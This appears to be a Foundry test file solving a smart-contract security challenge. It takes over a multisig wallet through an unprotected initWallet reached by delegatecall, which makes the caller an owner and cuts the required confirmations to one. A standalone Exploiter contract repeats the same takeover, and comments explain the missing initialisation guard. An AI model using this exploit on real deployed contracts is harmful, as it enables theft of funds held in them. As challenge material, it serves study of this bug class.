// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "./utils/BaseTest.sol";

import "src/Wallet.sol";
import "src/WalletLibrary.sol";

contract WalletTest is BaseTest {
    Wallet private wallet;
    WalletLibrary private walletLibrary;

    constructor() {
        string[] memory userLabels = new string[](2);
        userLabels[0] = "Alice";
        userLabels[1] = "Bob";
        preSetUp(2, 100 ether, userLabels);
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();

        // Attach the contract to the addresses on the fork
        wallet = Wallet(payable(0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7));
        walletLibrary = WalletLibrary(payable(0x43FF315d0003365fe1246344115A3142b9EBfe0b));

        vm.label(address(wallet), "Wallet");
        vm.label(address(0x43FF315d0003365fe1246344115A3142b9EBfe0b), "WalletLibrary");
    }

    function testTakeOwnership() public {
        address player = users[0];
        vm.startPrank(player);

        // prepare the attack
        address[] memory owners = new address[](1);
        owners[0] = player;

        // call the `wallet.fallback` function passing the correct data to make it make a
        // delegatecall to walletLibrary that will execute initWallet on Wallet's context
        // initWallet should be protected by a flag that check if the contract has been initialized or not
        // like require(owners.length == 0)
        // by doing so we have been added to the list of owners
        // but we can execute any transaction we want because we have lowered the amount of needed confirmation request
        // required to only 1
        (bool success, ) = address(wallet).call(abi.encodeWithSignature("initWallet(address[],uint256)", owners, 1));

        assertEq(success, true);
        assertEq(wallet.numConfirmationsRequired(), 1);
        assertEq(wallet.owners(3), player);

        // Now I'm one of the owners and because numConfirmationsRequired = 1 I can execute tx

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor() {
        // prepare the attack
        address[] memory owners = new address[](1);
        owners[0] = msg.sender;

        // call the `wallet.fallback` function passing the correct data to make it make a
        // delegatecall to walletLibrary that will execute initWallet on Wallet's context
        // initWallet should be protected by a flag that check if the contract has been initialized or not
        // like require(owners.length == 0)
        // by doing so we have been added to the list of owners
        // but we can execute any transaction we want because we have lowered the amount of needed confirmation request
        // required to only 1
        (bool success, ) = address(0x19c80e4Ec00fAAA6Ca3B41B17B75f7b0F4D64CB7).call(
            abi.encodeWithSignature("initWallet(address[],uint256)", owners, 1)
        );
    }
}
